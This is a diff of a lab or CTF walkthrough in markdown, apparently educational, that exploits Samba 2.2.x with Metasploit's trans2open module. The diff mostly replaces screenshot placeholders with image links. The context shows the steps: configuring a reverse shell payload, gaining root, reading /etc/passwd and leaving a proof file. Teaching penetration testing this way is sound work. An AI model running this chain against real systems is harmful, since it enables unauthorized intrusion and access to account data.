@@ -65,8 +65,8 @@ PORT    STATE SERVICE     VERSION
 
 > **Key finding:** Port **139** is running **Samba 2.2.x** — a file-sharing service. This is an old version with a known critical vulnerability.
 
-![Nmap Scan Results](screenshots/01-nmap-scan.png)
-*Screenshot placeholder: nmap output showing open ports and service versions*
+<img width="1920" height="1080" alt="image" src="https://github.com/user-attachments/assets/656447f9-1681-494f-abf0-d2450cc53068" />
+
 
 ---
 
@@ -94,8 +94,8 @@ Metasploit is a widely-used penetration testing framework that contains hundreds
 msfconsole
 ```
 
-![Metasploit Console](screenshots/02-msfconsole-open.png)
-*Screenshot placeholder: msfconsole startup screen*
+<img width="1131" height="650" alt="image" src="https://github.com/user-attachments/assets/1f85e4aa-28cc-4e4d-895e-4276b3506a41" />
+
 
 ---
 
@@ -107,8 +107,8 @@ msf6 > search samba 2.2
 
 **What this does:** Searches Metasploit's database for any exploit that matches "samba 2.2". We're looking for something that targets the vulnerability we identified.
 
-![Metasploit Search](screenshots/03-search-samba.png)
-*Screenshot placeholder: search results showing trans2open exploit*
+<img width="1131" height="650" alt="image" src="https://github.com/user-attachments/assets/00fc6f0b-04e6-483e-a17b-f6c4e78157eb" />
+
 
 ---
 
@@ -140,8 +140,8 @@ msf6 exploit(trans2open) > set LHOST 10.0.2.20
 
 > **Reverse shell explained simply:** Instead of us connecting to the target (which firewalls often block), we trick the target into connecting to *us*. It's like instead of knocking on someone's locked door, you convince them to open their door and come find you.
 
-![Exploit Configuration](screenshots/04-exploit-config.png)
-*Screenshot placeholder: show options after setting RHOSTS, PAYLOAD, and LHOST*
+<img width="1131" height="650" alt="image" src="https://github.com/user-attachments/assets/b572e69a-0532-46af-aae4-a9e2774b5154" />
+
 
 ---
 
@@ -165,8 +165,8 @@ msf6 exploit(trans2open) > exploit
 msf6 exploit(trans2open) > sessions -i 1
 ```
 
-![Exploit Running](screenshots/05-exploit-running.png)
-*Screenshot placeholder: exploit output showing session opened*
+<img width="1131" height="650" alt="image" src="https://github.com/user-attachments/assets/a8795446-b71a-4f6e-ba9c-b16fb90d2950" />
+
 
 ---
 
@@ -186,9 +186,8 @@ root
 ```
 
 We have the highest level of access on this machine.
+<img width="1131" height="650" alt="image" src="https://github.com/user-attachments/assets/cf5fda25-b319-456a-bb54-f2da36758bdf" />
 
-![whoami root](screenshots/06-whoami-root.png)
-*Screenshot placeholder: terminal showing "root" output*
 
 ---
 
@@ -219,8 +218,8 @@ cat /etc/passwd
 
 **Notable users found:** `john`, `harold`
 
-![/etc/passwd contents](screenshots/07-passwd-file.png)
-*Screenshot placeholder: /etc/passwd output showing john and harold users*
+<img width="1131" height="650" alt="image" src="https://github.com/user-attachments/assets/68c761e3-bf98-4fe9-be52-8034317978df" />
+
 
 ---
 
@@ -233,8 +232,10 @@ cat /tmp/pwned.txt
 
 **What this does:** Creates a file in the `/tmp` directory as evidence that we successfully owned the machine. This is standard practice in CTF challenges and real penetration tests (pen testers leave "flags" or proof files for the client).
 
-![Proof File](screenshots/08-pwned-proof.png)
-*Screenshot placeholder: terminal showing pwned.txt creation and content*
+<img width="755" height="335" alt="image" src="https://github.com/user-attachments/assets/d30b0faf-1c4e-411a-80d3-666bd0ce4ba8" />
+
+<img width="755" height="335" alt="image" src="https://github.com/user-attachments/assets/73000453-f6fa-44f2-a9d6-f030d3a4afa2" />
+
 
 ---
 
